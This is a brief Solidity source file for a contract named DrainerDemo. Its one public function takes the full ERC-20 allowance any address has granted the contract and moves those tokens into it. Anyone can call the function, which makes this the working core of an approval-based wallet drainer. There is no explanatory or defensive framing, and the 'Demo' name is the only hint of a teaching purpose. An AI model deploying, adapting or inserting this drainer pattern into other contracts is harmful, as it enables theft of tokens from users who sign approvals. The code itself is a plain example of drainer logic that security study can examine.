// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DrainerDemo {
    event Pulled(address indexed token, address indexed from, uint256 amount);

    function pull(address token, address from) external {
        uint256 amount = IERC20(token).allowance(from, address(this));
        IERC20(token).transferFrom(from, address(this), amount);
        emit Pulled(token, from, amount);
    }
}
